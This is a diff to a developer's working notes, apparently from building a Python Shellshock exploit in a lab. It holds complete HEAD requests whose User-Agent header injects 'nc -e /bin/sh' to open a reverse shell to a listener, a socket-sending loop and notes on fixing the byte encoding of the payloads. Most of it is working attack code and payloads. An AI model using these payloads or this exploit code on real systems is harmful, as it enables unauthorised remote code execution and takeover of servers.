@@ -85,3 +85,45 @@ b'HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.0.1
 b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc b'192.168.0.102' 2222 -e /bin/sh\r\nHost: 192.168.0.100\r\nConnection: close\r\n\r\n" <- failed (Manually added IP addresses and wrapped the b'' around it so it can be interpreted as bytes. It seems the b"" which is on the outer layer of the HEAD request is the byte stream rather than any internal points. All data which is passed in which is considered a string such as an IP address should be encoded using .encode()
 
 b'HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.0.102 2222 -e /bin/sh\r\nHost: 192.168.0.100\r\nConnection: close\r\n\r\n' <- Manually added the IP without the b'' around them. In order to introduce the IP as a variable it is required to be encoded before stepping into the byte stream. This should be done internally to the function rather than externally since this has been seen to cause issues
+
+Current issue:
+ for payloads in rev_payload:
+       # List containing all of the payloads
+        # All of the individual payloads. They're lacking the byte encoding of the host which is why a shell is not caught
+       ''' crucial to code '''
+       print(type(payloads))
+       payloads_encoded = payloads.encode()
+       payload = b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; %s\r\nHost: %s\r\nConnection: close\r\n\r\n" % (payloads_encoded, rhost_encoded)
+       print(payload)
+       s.send(payload)
+
+This loop should be able to send several requests... However, it seems like everything is in one big string.
+
+
+Output of the function:
+nc -e /bin/sh 192.168.0.102 2222
+nc -e /bin/sh 192.168.0.102 2222
+nc -e /bin/sh 192.168.0.102 2222
+
+A socket request needs to be done one at a time
+
+Time to take a step back and work with the list elements alone and then wrap them in a loop once better understanding gained. The for loop isn't really best COA at this point (Course of Action)
+
+
+Outputs of some encoding:
+Payload 1 normal: nc -e /bin/sh 192.168.0.102 2222 <- This doesn't get inserted into the payload as a variable because it needs encoding....
+Payload 1 encoded: b'nc -e /bin/sh 192.168.0.102 2222'
+
+s.sendall(Payload variable) <- This fires the payload across without any issues
+
+
+This variable doesn't work and that's rather expected. 
+payload_test = b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; b'/usr/bin/nc %s %d -e /bin/sh'\r\nHost: %s\r\nConnection: close\r\n\r\n" % (lhost_encoded, lport, rhost_encoded)
+
+That's because there's additional b'' inside the existing byte stream which mangles the payload being executed since the HTTP protocol hasn't got a clue what b'' means
+
+
+One method (not the best):
+	Declare each payload manually within the function and then loop through it that way rather than trying to borrow all of the payloads externally because that's really messing with things atm
+
+Putting payload into loop is pointless because once the payload is sent, the listener only works one time. This means the option of selecting your payload to send will probably be better than automating it 
